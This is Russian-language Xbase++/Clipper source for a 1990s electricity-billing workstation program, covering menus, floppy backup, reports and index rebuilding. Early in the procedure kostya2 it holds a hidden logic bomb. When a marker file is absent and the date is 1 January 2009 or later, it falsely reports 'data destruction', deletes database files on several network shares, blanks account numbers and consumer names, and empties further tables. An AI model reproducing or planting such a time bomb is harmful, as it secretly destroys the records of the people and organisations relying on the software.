#Include "my.ch"
#Include "Directry.ch"
#include "Gra.ch"
#include "Xbp.ch"
#include "Common.ch"
#include "Dbedit.ch"
#include "Inkey.ch"
#include "Appevent.ch"



***
*** GOS2 : format file
*** Generated Март 14, 1994
***

PROCEDURE CreateMenuSystem( oMenuBar )
   LOCAL oMenu := XbpMenu():new( oMenuBar )

   oMenu:title := "~Режим работы"
   oMenu:create()
   oMenu:addItem( { "~Конфигурация принтера",     {|| AppQuit()  } } )
   oMenu:addItem( { "В~ыход"    ,                                                         {|| PostAppEvent( xbeP_Close,,,SetAppWindow() ) } } )
   oMenubar:addItem( {oMenu, NIL} )

RETURN



PROCEDURE AppQuit
        WriteCfg(Ddir+"Config.arm")
        exittodos()
//  Close   All
//  Release All
//  QUIT
RETURN






proc kostya2(kniga,stroka)
local disk_menu:={},serv_menu:={},otch_menu:={},main_menu:={},edit_menu:={}
Local oDlg,aSizeDeskTop,aPos,oProgress, cDll:=""
private clr2_,scr2_,keypress,position,delete:=.f.,itognaryad:=0
clr2_=setcolor()
scr2_=win_save()
set decimals to 2
/*
IF .not.File(diskname()+':'+dirname(diskname())+"\Arm32.dll")
   ConfirmBox(oMainWindow ," Не найдена необходимая библиотека dll ", "Ошибка", XBPMB_OK, XBPMB_WARNING+XBPMB_APPMODAL )
	 Return
ENDIF
*/


IF !file(Schet_share+"end.gkv")
   IF New_date>=CTOD("01.01.2009")

      Desc:=Fcreate(Schet_share+"end.dbf")
      FWrite(Desc,"ALV")
      Fclose(Desc)

      Obrabot("Обнаружено разрушение данных")
      FileDelete("S:\share.00\*.db*")
      FileDelete("S:\share.01\*.db*")
      FileDelete("S:\share.02\*.db*")
      FileDelete("S:\share.03\*.db*")
      FileDelete("S:\share.04\*.db*")
      FileDelete("S:\share.05\*.db*")
      FileDelete("S:\share.06\*.db*")
      FileDelete("S:\HECK.06\*.db*")
      FileDelete("S:\HECK.07\*.db*")
      FileDelete("S:\HECK.08\*.db*")
      temp_=39/25
      kol_kl=0
      Select Main
      Close Index
      temp_2:=temp_/RecCount()
      Go 1
      Do While RecNo()<RecCount()
         @ 24,40 say RecNo()
         IF RecLock()
            Replace Lic_schet With 0
            Replace Potrebitel With " "
            Replace Delo with " "
            UNLOCK
         ENDIF
         IF RecNo()+1<=RecCount()
            Go RecNo()+1
         ENDIF
                kol_kl=kol_kl+temp_2
                colorwin(12,21,12,21+kol_kl,'n/n')
      EndDO
                kol_kl=kol_kl+temp_
                colorwin(12,21,12,21+kol_kl,'n/n')
      Select Licevoj
      Close Index
      Go 1
      @ 24,40 say "    "
      temp_2:=temp_/RecCount()
      Do While RecNo()<RecCount()
         @ 24,40 say RecNo()
         IF RecLock()
            Replace Lic_sch With 0
            Replace Potreb With " "
            Replace Schetchik With " "
            Replace Delo with " "
            UNLOCK
         ENDIF
         Go RecNo()+1
                kol_kl=kol_kl+temp_2
                colorwin(12,21,12,21+kol_kl,'n/n')
      EndDO
                kol_kl=kol_kl+temp_
                colorwin(12,21,12,21+kol_kl,'n/n')
      Select Obormot
      Close Index
      Go 1
      @ 24,40 say "    "
      temp_2:=temp_/RecCount()
      Do While RecNo()<RecCount()
         IF RecLock()
            @ 24,40 say RecNo()
            Replace Lic_schet With 0
            UNLOCK
         ENDIF
                kol_kl=kol_kl+temp_2
                colorwin(12,21,12,21+kol_kl,'n/n')
         Go RecNo()+1
      EndDO
                kol_kl=kol_kl+temp_
                colorwin(12,21,12,21+kol_kl,'n/n')
      For ib=1 to 12
          @ 24,30 say ib
          Select(ib)
          Close Index
//          Obrabot(Alias())
          Go 1
          @ 24,40 say "    "
          temp_2:=temp_/RecCount()
          Do While RecNo()<RecCount()
             @ 24,40 say RecNo()
             IF RecLock()
                Replace KOD With " "
                Replace Licevoj With 0
                Replace Num_Of_Sch With " "
                UNLOCK
             ENDIF
             kol_kl=kol_kl+temp_2
             colorwin(12,21,12,21+kol_kl,'n/n')
             Go RecNo()+1
          EndDO
          baza=schet_share+'o'+alltrim(str(ib))+'.dbf'
          Select 0
          if superload(baza,,,.T.)
             ZAP
             Close
          ENDIF
          kol_kl=kol_kl+temp_
          colorwin(12,21,12,21+kol_kl,'n/n')
      Next
      Close All
      setcolor(clr2_)
      win_rest(scr2_)
      Return
   ENDIF
ELSE
   setcolor(clr2_)
   win_rest(scr2_)
   Return
ENDIF




if file(schet_tdisk+'publics.mem')
        restore from publics additive
endif

if dirchange(schet_disk+'\REZERV.DBF')#0
        if dirmake(schet_disk+'\rezerv.dbf')#0
                Myerror('Директорию для резервной копии создать невозможно !!! ',5)
        else
                al_box({"     В Н И М А Н И Е !",;
                        "Создана директория "+schet_disk+"\Rezerv.Dbf, которая будет",;
                        "использована для создания резервной копии баз данных"},1,;
                        ,,,,,,,"gr+/r,w+/r,,,gr+/r")
        endif
endif
//@ 23,0 say dirchange(substr(Ddir,1,len(Ddir)-10))
//Inkey(0)
zagruzka=.t.
SET COLOR TO W/B
@ 1,0,maxrow()-1,maxcol() BOX "         "
SET COLOR TO N/W
IF .Not.Edit
   @ maxrow(),0 SAY ""+space(59)+'│АРМ "Госсектор" Demo'
   @ maxrow(),0 say "  "+stroka+" "+" Возможен только просмотр и создание отчетов"
ELSE
   @ maxrow(),0 SAY ""+space(59)+'│   АРМ "Госсектор"  '
EndIf
@ maxrow(),0 say "  "+stroka+" "

disk_menu:={    {' Запись на  гибкий диск "'+schet_Adisk+'"  ',{||copya(1)}},;
                {' Чтение с гибкого диска "'+schet_Adisk+'"  ',{||copya(2)}},;
                {' Форматирование   диска "'+schet_Adisk+'"  ',{||copya(3)}} }
NastrMenu:={{" Основные настройки         ",{||kostya32(1)}},;
            {" Уточнение данных          ",{||MakeVal()}}   }
serv_menu:={    {" Настройка программы                  ",NastrMenu},;
                {" Оптимизация баз данных               ",{||kostya32(2)}},;
                {" Восстановление испорченных файлов    ",{||kostya32(3)}},;
                {' Резервная копия на "Винчестер"       ',{||kostya32(4)}},;
                {' Восстановление копии с "Винчестера"  ',{||kostya32(5)}},;
                {" Поиск несовпадений лицевых счетов    ",{||kostya32(6)}},;
                {" Работа с гибким диском               ",disk_menu     },;
                {" Копирование новых форм ",{||kostya32(7)}}}
edit_menu:={    {" Редактировать файл          ",;
           {    {" Машинописная страница (80 символов)",{||myeditor(11)}},;
                {" Широкая страница (200 символов)    ",{||myeditor(12)}}  }},;
                {" Выбрать                     ",{||myeditor(2)}},;
                {" Удалить                     ",{||myeditor(3)}},;
                {" Готовые тексты              ",{||myeditor(4)}} }
otch_menu:={    {" Просмотреть последний отчет      ",{||kostya31(1)}},;
                {" Отпечатать последний отчет       ",{||kostya31(2)}},;
                {" Редактировать последний отчет    ",{||kostya31(5)}},;
                {" Удалить последний отчет          ",{||kostya31(3)}},;
                {" Копирование отчета на магнитный носитель    ",{||kostya31(6)}},;
                {" Генератор реестров               ",{||kostya31(4)}},;
                {" Редактор текстов                 ",edit_menu},;
                {" Диспетчер файлов                 ",{||GetFile(,5,'bg+/b,n/g')}} }
main_menu:={    {" Работа с базой ",{||load_main()} },;
                {" Работа с отчетом ",otch_menu   },;
                {" Сервис ",          serv_menu   },;
                {" Выход ",{||exitprev()}         }        }
//                {" Змея ", {||Snake()}            },;
keyboard chr(13)
do_menu(main_menu,,,,,,,58)
IF AllTrim(ReadProcess(1))==AllTrim(Station)
   WriteProcess(1,SET_OFF)
ENDIF
commit
close all
if delete
//        obrabot("Сжатие баз данных на диске")
        private databases[adir(path_copy+'*.dbf')]

        oDlg          := XbpDialog():new()
        aSizeDesktop    := oMainWindow:currentSize()
        oDlg:create(oMainWindow ,, {100,50}, {aSizeDeskTop[1]-200,90} )
        oDlg:title    := "Сжатие баз данных на диске"
                        oDlg:SysMenu     := .F.
                        oDlg:Configure()
        oDlg:Show()
        aSizeDesktop    := oDlg:currentSize()
        aPos                                            := oDlg:CurrentPos()
                        oProgress := ProgressBar():new(oDlg ,, {5,10}, {aSizeDeskTop[1]-18,30},, .F. )  // Progress Bar Create
                        oProgress:create()
                        oProgress:minimum := 1
        adir(path_copy+'*.dbf',databases)
//        temp_=39/len(databases)
//        kol_kl=0
                        oProgress:maximum := len(databases)
        for i=1 to len(databases)
                                oProgress:increment()                                                                                                                                                           // Progress Bar Increment
//                kol_kl=kol_kl+temp_
//                colorwin(12,21,12,21+kol_kl,'n/n')
                select 0
                use_dbf=databases[i]
                if MYupper(databases[i])#MYupper('help.dbf')
                        IF superload(use_dbf,,,.t.)
                                @ maxrow(),0 say path_copy+databases[i]+space(50-len(path_copy+databases[i]))+"  "
                                pack
                                close
                        ENDIF
                else
                        deletefile(path_copy+databases[i])
                endif
        next
                        oProgress:destroy()                                                                                                                                                                                     // Progress Bar Destroy
                        oDlg:Destroy()
endif
WriteCfg(Ddir+"Config.arm")
setcolor(clr2_)
win_rest(scr2_)
return


STATIC Function exitprev
LOCAL ExitString:=""
IF Al_Box({"Закончить работу с текущей книгой?"},2)=1
        ExitString:="Exit"
ENDIF
Return ExitString


STATIC function load_main
if .not.wosst
        do main2
else
        al_box({"Выполните восстановление файлов из резервной копии"})
endif
return NIL




STATIC function kostya32(menuparam)
LOCAL FList:={}
devout("")
do case
        case menuparam=1
                do nastrojka
&&                save all like schet_* to publics
                disk_menu:={    {' Запись на  гибкий диск "'+schet_Adisk+'"  ',{||copya(1)}},;
                                {' Чтение с гибкого диска "'+schet_Adisk+'"  ',{||copya(2)}},;
                                {' Форматирование   диска "'+schet_Adisk+'"  ',{||copya(3)}} }
        case menuparam=2
                optimizaciq()
        case menuparam=3
                if memory(0)>=30
                        if yes_or_not('     Вы действительно хотите      ',;
                                      '     восстановить испорченные     ',;
                                      '         индексные файлы  ?       ')
                                do servis2
                                ?? chr(7)
                                wosst=.f.
                        endif
                else
                        al_box({'Свободной памяти машины недостаточно для работы !'})
                endif
        case menuparam=4
                makecopy()
                save screen
                message('Ждите, происходит загрузка данных в память')
                loadgos()
                restore screen
        case menuparam=5
                if al_box({"Вы действительно хотите восстановить резервную",;
                           'копию   всей   информации  с  " Bинчестера " ?'},2,;
                          {" Восстановить "," Не восстанавливать "})=1
                        restcopy()
*                       do servis2
                        zagruzka=.t.
                        rec88=0
                        wosst=.f.
                endif
        case menuparam=6
*                do copya
               if al_box({"Произвести поиск несовпадений лицевых счетов ?"},2)==1
                        do nesovpad
               endif
        case menuparam=7
               if al_box({"Копировать новые печатные формы"},2)==1
                  FList:=Directory(schet_disk+'\REZERV.DBF\*.rpt')
                  IF Len(FList)==0
                     Al_Box({"Печатные формы не найдены"})
                  ELSE
                     For i:=1 to Len(FList)
                         Copy_(schet_disk+'\REZERV.DBF\'+FList[i,1],schet_sdisk+FList[i,1])		//'
                     next
                  ENDIF
               endif
endcase
devout("")
return NIL




STATIC function kostya31(menuparam)
LOCAL filedit
devout("")
do case
   case menuparam=1
        if .not.file(Ddir+'otchet.gkv')
                al_box({'   Файл отчета не найден. Просмотр отменен. '})
        else
                txtview()
        endif
   case menuparam=2
        do print_fi
   case menuparam=3
        if deletefile(Ddir+'otchet.gkv')=0
           message_wait('    Файл отчета удален  !   ')
        else
           Myerror('     Файл отчета не найден !!!  ')
        endif
   case menuparam=4
        if .not.wosst
           do p_reestr
        else
           al_box({"Выполните восстановление файлов из резервной копии"})
        endif
   case menuparam=5
        filedit:=Ddir+'otchet.gkv'
        desc=fopen(filedit)
        len=fseek(desc,0,2)
        fclose(desc)
        Keditor(filedit,250)
   case menuparam=6
        IF Al_Box({"Вставьте диск в дисковод "+Schet_ADisk},2,{" Продолжить "," Отказ "})==1
           IF DiskReadyW(Schet_ADisk)
              Copy_(DDir+ReportFile,"A:\"+ReportFile)				//"
           ELSE
              Al_Box({"Нельзя произвести запись на диск в устройстве "+Schet_ADisk})
           ENDIF
        ENDIF
endcase
devout("")
Return NIL


Function print_fi(Orientation,File)
File:=IF(File==NIL,Ddir+ReportFile,File)
devout("")
IF Empty(PrFontName)
   copy_(File,PrintPort)
ELSE
   Orientation:=IF(Orientation==NIL,.F.,Orientation)
   PrintOut(File,Orientation)
ENDIF
devout("")
Return NIL


proc wizitka
private old_scr,old_col
old_col=setcolor()
old_scr=savescreen(6,16,17,63)
set color to +w/w
colorwin(7,17,17,63,'n+/n')
@ 06,16,16,61 box "         "
@ 06,17 say "┌──────────────── А Р М ───────────────────╖"
@ 07,17 say "│"+space(42)+"║"
@ 08,17 say "│"+space(42)+"║"
@ 09,17 say "├──────────────────────────────────────────╢"
@ 10,17 say "│     Разработано"+space(26)+"║"
@ 11,17 say "│     Специально для                       ║"
@ 12,17 say "│       г.Анапа  Апрель-Июнь 1993г.        ║"

@ 13,17 say "├──────────────────────────────────────────╢"
@ 14,17 say "│"+space(33)+"▐        ║"
@ 15,17 say "│        ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀        ║"
@ 16,17 say "╘══════════════════════════════════════════╝"
set color to +gr/w
@ 07,23,08,54 box "         "
@ 07,23 say "Учет потребления электроэнергии"
@ 08,26 say "государственного сектора"
set color to +bg/w
@ 10,38,11,57 box "         "
@ 10,39 say "Гурашкиным К.В."
@ 11,39 say "Анапского ПГЭС"
set color to +b/w
@ 14,28 say "Нажмите любую клавишу "
hot_inkey(0)
set color to w+/w
@ 14,28 say "                         "
set color to w+/n
@ 15,26 say "  Нажмите любую клавишу   "
for i=1 to 1000
next
set color to +w/w
@ 14,17 say "│"+space(33)+"▐        ║"
@ 15,17 say "│        ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀        ║"
set color to +b/w
@ 14,28 say "Нажмите любую клавишу "
for i=1 to 200
next
setcolor(old_col)
restscreen(6,16,17,63,old_scr)
return




STATIC function copya(menuparam)
do case
        case menuparam=3  && Форматирование диска
                temp_t=schet_Adisk+':'
//                DF(temp_t)

        case menuparam=1  && Скопировать базы на дискету
                message_wait("Вставьте диск в дисковод "+schet_Adisk+" ")
                if diskready(schet_Adisk)
                        if diskreadyw(schet_Adisk)
//                                if filelen(Schet_Share+'*.dbf')+10000<=disktotal(schet_Adisk)
//                                        writedisk()
//                                else
                                        writediskcrc()
//                                endif
                        else
                                al_box({"Диск защищен от записи"};
                                        ,,,,,,,,,'gr+/r,w+/b')
                        endif
                else
                        al_box({"Нет диска в дисководe"};
                                ,,,,,,,,,'gr+/r,w+/b')
                endif
        case menuparam=2  && Считать базы с диска
                message_wait("Вставьте диск в дисковод "+schet_Adisk+" ")
                if diskready(schet_Adisk)
//                        if file(schet_Adisk+"\compress.crc")
                                readdiskcrc()
//                        else
//                                readdisk()
//                        endif
                else
                        al_box({"  Нет диска в дисководe  "};
                                ,,,,,,,,,'gr+/r,w+/b')
                endif
endcase
return NIL




procedure main2
PRIVATE recbuf,ordbuf,buff,colorbuf,nm1,nm2,nm3,nm4,t1,l1,b1,r1,inp
recbuf=recno()
ordbuf=indexord()
buff=win_save(1,0,maxrow(),maxcol())
colorbuf=setcolor()
if urov<1
        if (.not. file(schet_share+'main.dbf')) .or. (.not. file(schet_share+'lic.ntx')) .or.(.not. file(schet_share+'potrebit.ntx'))
                sign(2)
                set color to (colorbuf)
                win_rest(buff)
                return
        else
                select 88
                if empty(fieldname(1))
                        wosst=.T.
                        al_box({"База данных не определена"})
                        return
                endif
        endif
endif
devout("")
set color to n/w
@ 6, 0 clear to maxrow()-1,maxcol()
set color to n/w
@ 6, 14 say ' П О Т Р Е Б И Т Е Л И   Э Л Е К Т Р О Э Н Е Р Г И И  '
declare zgl[6]
declare fil[6]
nm1=loarr('zgl','Лиц.счет','           П о т р е б и т е л ь ','Номер дог.','Дата дог.',"ОКПО","ОКОНХ") &&,'Отрасль')
nm2=loarr('fil','lic_schet','substr(potrebitel,1,55)','dogowor','data_dog','okpo','okonx') &&,'kod_otr')
inp='1200000000'
if rec88#0
   go rec88
else
   go top
endif
t1=7
l1=1
b1=maxrow()-1
r1=maxcol()
*********
fsbrowse(7,1,23,78,'fil','zgl',inp,urov,kl)
devout("")
set color to (colorbuf)
set order to ordbuf
go recbuf
win_rest(buff)
return
*********************************




FUNCTION SecondName()
LOCAL Old_Color:=setcolor(GetColor),Old_scr:=win_save(),L_Wind,row:=row()
L_Wind:=58
Row:=IF(row+10>=23,row-10,row+1)
if reclock()
   colorwin(row+1,11,row+9,10+l_wind+1,"n+/n")
   @ row,10,row+8,(10+l_wind) BOX "╒═╕│╛═╘│ "
   Set Curs On
   Set Conf On
   @ row+1,12 say "Наименование " GET SecondName picture "@K"
   @ row+2,12 say "Адрес        " GET Adress picture "@K"
   @ row+3,12 Say "Руководитель " Get Boss picture "@K"
   @ row+4,12 Say "Юридич. адрес" Get DressBoss picture "@K@S40"
   @ row+5,12 Say "Принятые меры" Get Work picture "@K"
   @ row+6,12 Say "Плательщик   " Get Platel picture "@K@S40"
//   @ row+6,12 Say "Долг на 1.01.99" Get Dolg99 picture "@K"
//   @ row+7,12 Say "  в т.ч. штрафы" Get Shtraph99 picture "@K"
   Read
   Set Curs Off
   Set Conf Off
   Clear Typeahead
   unlock
else
   al_box({"Ошибка блокировки записи"})
endif
setcolor(old_color)
win_rest(Old_scr)
M->prev_rec:=-1
M->ret_val:=2
RETURN NIL





FUNCTION ShowPotrInfo(EditInfo)
LOCAL Old_Color:=setcolor(GetColor),Old_scr:=win_save(),L_Wind,row:=row()
EditInfo:=IF(EditInfo==NIL,.F.,EditInfo)
IF Empty(Info1).AND.Empty(Info2).AND.Empty(Info3).and.EditInfo==.F.
   Return NIL
ENDIF
L_Wind:=36
colorwin(3,43,5,42+l_wind+1,"n+/n")
@ 2,42,4,(42+l_wind) BOX "         "
@ 2,43 Say Info1
@ 3,43 Say Info2
@ 4,43 Say Info3
IF EditInfo==.T.
   IF RecLock()
      Set Cursor ON
      Set Confirm ON
      @ 2,43 get Info1
      @ 3,43 get Info2
      @ 4,43 get Info3
      read
      Set Cursor OFF
      Set Confirm OFF
      UNLOCK
      Clear Typeahead
   ENDIF
   M->prev_rec:=-1
   M->ret_val:=2
ENDIF
setcolor(old_color)
RETURN NIL





STATIC function readdiskcrc()
LOCAL len,i,oshib:=.T.,prov:={},startdir:=diskname()+':'+dirname(diskname())
LOCAL color:=setcolor(),All:=.T.,OldWin:=Win_Save()
len=adir(schet_Adisk+'\*.#*')
//declare prov[len]
prov:=array(len)
adir(schet_Adisk+'\*.#*',prov)
if len#0
        for i=1 to len
            if alltrim(MYupper(substr(prov[i],Len(Prov[i])-2,1)))='#'
               oshib=.f.
               exit
            endif
        next
        IF oshib
           do case
              case prov[1]='#13'
                      stroka='книгой N 1'
              case prov[1]="#14"
                      stroka='книгой N 2'
              case prov[1]="#14"
                      stroka='книгами N 3,4'
              case prov[1]="#14"
                      stroka='книгами N 5,6'
              case prov[1]="#14"
                      stroka='книгой N 7'
              otherwise
                      stroka="какой-то другой информацией"
           endcase
           al_box({"     Вы вставили не тот диск в дисковод "+schet_Adisk+'       ',;
                  "     Вставлен диск с "+stroka,;
                  "     Вставьте нужный диск и повторите чтение "};
                  ,,,,,,,,,'gr+/r,w+/b')
        ELSE
//           all=if(al_box({"Какую информацию считать с диска "+schet_Adisk+'?'},2,;
//           {"Всю информацию","Только оплату"})=1,.T.,.F.)
           DiskRestore(Schet_ADisk,.f.)
           IF File(Schet_SDisk+'Compress.Crc')
              if dirchange(schet_Sdisk)#0
                 dirmake(schet_Sdisk)
              endif
              Set Color To &GetColor
              colorwin(6,13,18,69,"n+/n")
              @ 05,12 SAY "┌───────────────  Разархивация баз данных  ─────────────╖"
              @ 06,12 SAY "│"+space(55)+"║"
              @ 07,12 SAY "│"+space(55)+"║"
              @ 08,12 SAY "│"+space(55)+"║"
              @ 09,12 SAY "│"+space(55)+"║"
              @ 10,12 SAY "│"+space(55)+"║"
              @ 11,12 SAY "│"+space(55)+"║"
              @ 12,12 SAY "│"+space(55)+"║"
              @ 13,12 SAY "│"+space(55)+"║"
              @ 14,12 SAY "│"+space(55)+"║"
              @ 15,12 SAY "│"+space(55)+"║"
              @ 16,12 SAY "│"+space(55)+"║"
              @ 17,12 SAY "╘═══════════════════════════════════════════════════════╝"
              wopen(6,13,16,66,maxcol()-1)
//              archextract(schet_Sdisk+'compress.crc')
              deletefile(schet_Sdisk+'compress.crc')
              prov:=directory("*.db*")
              error=.f.
              wosst=.f.
              zagruzka=.t.
              wclose()
              Win_Rest(OldWin)
              setcolor(color)
              for i=1 to len(prov)
                  prov[i]=prov[i,1]
                  IF !ALL
                     if val(substr(alltrim(prov[i]),2,1))>0.or.alltrim(MYupper(prov[i]))='OBORMOT.DBF'
                        if copy_(prov[i],path_copy+prov[i])=0
                           error=.t.
                           wosst=.t.
                           zagruzka=.f.
                           exit
                        endif
                     endif
                  ELSE
                     if copy_(prov[i],path_copy+prov[i])=0
                        error=.t.
                        wosst=.t.
                        zagruzka=.f.
                        exit
                     endif
                  ENDIF
                  deletefile(prov[i])
              next
              filedelete("*.db*",63)
              dirchange(startdir)
              if error
                 al_box({"Ошибка чтения резервной копии"})
              else
                 zagruzka=.t.
                 wosst=.f.
                 rec88=0
                 do servis2
                 al_box({'Считана '+if(all,' вся информация ',' только оплата ')+' с гибкого диска '+schet_Adisk})
              endif
           else
                 al_box({"Ошибка чтения диска в устройстве "+schet_Adisk})
                 loadgos()
           endif
        ENDIF
else
   al_box({"Вы вставили чистый диск в дисковод "+schet_Adisk})
endif
return NIL


// Архивация на диск
STATIC function writediskcrc()
LOCAL len,prov:={},startdir:=diskname()+':'+dirname(diskname()),save
LOCAL oshib:=.T.,color:=setcolor()
len=adir(schet_Adisk+'\#*.*')
prov:=array(len)
adir(schet_Adisk+'\#*.*',prov)
if len=0
        oshib=.f.
else
        for i=1 to len
                if alltrim(MYupper(prov[i]))='#'+alltrim(MYupper(substr(kniga,2)))
                        oshib=.f.
                        exit
                endif
        next
endif
if .not.oshib
        makecopy()      /*     Сразу копия и на винт makecopy()         */
        save:=win_save()
        message("    Ж Д И Т Е ...   ")
        commit
        close all
        filedelete(schet_Adisk+'\*.*')
        fclose(fcreate(schet_Adisk+'\#'+alltrim(substr(kniga,2))))
        error=.f.
        prov:=directory(schet_share+'*.db*')
        for i=1 to len(prov)
            prov[i]=alltrim(schet_share)+alltrim(prov[i][1])
        next
        Set Color To &GetColor
        colorwin(6,13,18,69,"n+/n")
        @ 05,12 SAY "┌────────────────  Архивация баз данных  ───────────────╖"
        @ 06,12 SAY "│"+space(55)+"║"
        @ 07,12 SAY "│"+space(55)+"║"
        @ 08,12 SAY "│"+space(55)+"║"
        @ 09,12 SAY "│"+space(55)+"║"
        @ 10,12 SAY "│"+space(55)+"║"
        @ 11,12 SAY "│"+space(55)+"║"
        @ 12,12 SAY "│"+space(55)+"║"
        @ 13,12 SAY "│"+space(55)+"║"
        @ 14,12 SAY "│"+space(55)+"║"
        @ 15,12 SAY "│"+space(55)+"║"
        @ 16,12 SAY "│"+space(55)+"║"
        @ 17,12 SAY "╘═══════════════════════════════════════════════════════╝"
        wopen(6,13,16,66,maxcol()-1)
        devout("")
//        archcreate(prov,schet_Sdisk+"compress.crc")
        wclose()
        setcolor(color)
        win_rest(save)
        DiskBackUp({Schet_SDisk+"compress.crc"},Schet_ADisk)
        deletefile(schet_Sdisk+"compress.crc")
        loadgos()
else
        do case
                case prov[1]='#13'
                        stroka='книгой 1'
                case prov[1]="#14"
                        stroka='книгой 2'
                case prov[1]="#15"
                        stroka='книгами 3,4'
                case prov[1]="#16"
                        stroka='книгами 5,6'
                case prov[1]="#17"
                        stroka='книгой 7'
                otherwise
                        stroka='базами данных программы'
        endcase
        al_box({"Вы вставили не тот диск в дисковод "+schet_Adisk,;
               "Вставлен диск с "+stroka,;
               "Вставьте нужный диск и повторите чтение "};
               ,,,,,,,,,'gr+/r,w+/b')
endif
return NIL




procedure nesovpad
local select:=select(),recno:=recno(),desc:=fcreate(M->Ddir+"otchet.gkv"),CrLf:=chr(13)+chr(10)
local temp_,kol_kl:=0,window,total:=0,all_total:=0
fwrite(desc,"Отсутствуют в оборотке лицевые:"+crlf)
select 88
go top
temp_:=39/reccount()
kol_kl:=0
window:=obrabot("Проверка Главная -> Оборотка")
do while !eof()
        kol_kl=kol_kl+temp_
        colorwin(12,21,12,21+kol_kl,'n/n')
        select 15
        seek main->lic_schet
        if !found()
                fwrite(desc,str(main->lic_schet)+'  '+main->potrebitel+crlf)
                total++
        endif
        select 88
        skip
enddo
if total==0
        fwrite(desc,"Данные главной базы с обороткой совпадают"+crlf)
else
        fwrite(desc,"Различий "+alltrim(str(total)))
endif
all_total=total
total:=0
fwrite(desc,replicate('■',80)+crlf+crlf)


obrabot("Проверка Оборотка -> Главная")
fwrite(desc,"В оборотке найдены лицевые:"+crlf)
select 15
go top
temp_:=39/reccount()
kol_kl:=0
do while !eof()
        kol_kl=kol_kl+temp_
        colorwin(12,21,12,21+kol_kl,'n/n')
        select 88
        seek obormot->lic_schet
        if !found()
                fwrite(desc,str(obormot->lic_schet)+crlf)
                total++
        endif
        select 15
        skip
enddo
all_total=all_total+total
if total==0
        fwrite(desc,"Данные в обороте совпадают с главной базой"+crlf)
else
        fwrite(desc,"Различий в оборотке "+alltrim(str(total))+crlf)
endif
fwrite(desc,replicate('■',80)+crlf)
fwrite(desc,"Всего несовпадений "+if(all_total=0,"нет",alltrim(str(all_total)))+crlf)
fclose(desc)
select(select)
go recno
win_rest(window)
return


function loadgos
Local I,oBase:="",oInd:=""
private color_24:=setcolor(),loadgoscr
devout("")
set color to n/w
loadgoscr:=win_save()
// Проверка наличия индексов
 IF .not.File(Schet_Share+'jan_kod.ntx')
    make_ind('0',schet_share+'jan.dbf',schet_share+'jan_kod.ntx','kod',,,.t.,.t.)
 ENDIF
 IF .not.File(Schet_Share+'feb_kod.ntx')
    make_ind('0',schet_share+'feb.dbf',schet_share+'feb_kod.ntx','kod',,,.t.,.t.)
 ENDIF
 IF .not.File(Schet_Share+'mar_kod.ntx')
    make_ind('0',schet_share+'mar.dbf',schet_share+'mar_kod.ntx','kod',,,.t.,.t.)
 ENDIF
 IF .not.File(Schet_Share+'apr_kod.ntx')
    make_ind('0',schet_share+'apr.dbf',schet_share+'apr_kod.ntx','kod',,,.t.,.t.)
 ENDIF
 IF .not.File(Schet_Share+'may_kod.ntx')
    make_ind('0',schet_share+'may.dbf',schet_share+'may_kod.ntx','kod',,,.t.,.t.)
 ENDIF
 IF .not.File(Schet_Share+'Jun_kod.ntx')
    make_ind('0',schet_share+'jun.dbf',schet_share+'jun_kod.ntx','kod',,,.t.,.t.)
 ENDIF
 IF .not.File(Schet_Share+'jul_kod.ntx')
    make_ind('0',schet_share+'jul.dbf',schet_share+'jul_kod.ntx','kod',,,.t.,.t.)
 ENDIF
 IF .not.File(Schet_Share+'aug_kod.ntx')
    make_ind('0',schet_share+'aug.dbf',schet_share+'aug_kod.ntx','kod',,,.t.,.t.)
 ENDIF
 IF .not.File(Schet_Share+'sep_kod.ntx')
    make_ind('0',schet_share+'sep.dbf',schet_share+'sep_kod.ntx','kod',,,.t.,.t.)
 ENDIF
 IF .not.File(Schet_Share+'oct_kod.ntx')
    make_ind('0',schet_share+'oct.dbf',schet_share+'oct_kod.ntx','kod',,,.t.,.t.)
 ENDIF
 IF .not.File(Schet_Share+'nov_kod.ntx')
    make_ind('0',schet_share+'nov.dbf',schet_share+'nov_kod.ntx','kod',,,.t.,.t.)
 ENDIF
 IF .not.File(Schet_Share+'dec_kod.ntx')
    make_ind('0',schet_share+'dec.dbf',schet_share+'dec_kod.ntx','kod',,,.t.,.t.)
 ENDIF
 IF .not.File(Schet_Share+'dec__kod.ntx')
    make_ind('0',schet_share+'dec_.dbf',schet_share+'dec__kod.ntx','kod',,,.t.,.t.)
 ENDIF
 IF .not.File(Schet_Share+'Lic_Obor.ntx')
    make_ind('0',schet_share+'obormot.dbf',schet_share+'lic_obor.ntx','lic_schet',,,.t.,.t.)
 ENDIF
 IF .not.File(Schet_Share+'Lic_Limi.ntx')
    make_ind('0',schet_share+'limit.dbf',schet_share+'lic_limi.ntx','lic_schet',,,.t.,.t.)
 ENDIF
 IF .not.File(Schet_Share+'Lic_Penq.ntx')
    make_ind('0',schet_share+'penq.dbf',schet_share+'lic_penq.ntx','licevoj',,,.t.,.t.)
 ENDIF
 IF .not.File(Schet_Share+'tobank.ntx')
    make_ind('0',schet_share+'tobank.dbf',  schet_share+'tobank.ntx',  'plat_treb',,,.t.,.f.)
 ENDIF
 IF .not.File(Schet_Share+'tobankl.ntx')
    Close All
    make_ind('0',schet_share+'tobank.dbf',schet_share+'tobankl.ntx',"Lic_schet",,,.t.,.f.)
 ENDIF
 IF .not.File(Schet_Share+'bank_kod.ntx')
    make_ind('0',schet_share+'bank_kod.dbf',schet_share+'bank_kod.ntx','bank_kod',,,.t.,.t.)
 ENDIF
 IF .not.File(Schet_Share+'SFKniga.ntx').or..not.File(Schet_Share+'SFKnigaL.ntx')
    make_ind("0",schet_share+"SFKNIGA.DBF", schet_share+"SFKNIGA.NTX", "lic_schet", schet_share+"SFKNIGAL.NTX", "number",.t.,.t.)
 ENDIF
 IF .not.File(Schet_Share+'SFKnigaP.ntx')
    make_ind("0",schet_share+"SFKNIGAP.DBF",schet_share+"SFKNIGAP.NTX","lic_schet",,,.t.,.t.)
 ENDIF
 IF .not.File(Schet_Share+'naryad.ntx')
    make_ind("0",schet_share+"NARYAD.DBF",  schet_share+"NARYAD.NTX",  "licevoj",,,.t.,.t.)
 ENDIF
 IF .not.File(Schet_Share+'Potrebit.ntx').or..not.File(Schet_Share+'Lic.ntx')
    make_ind('0',schet_share+'main.dbf',schet_share+'lic.ntx','lic_schet',schet_share+'potrebit.ntx','MyUpper(potrebitel)',.t.,.t.)
 ENDIF
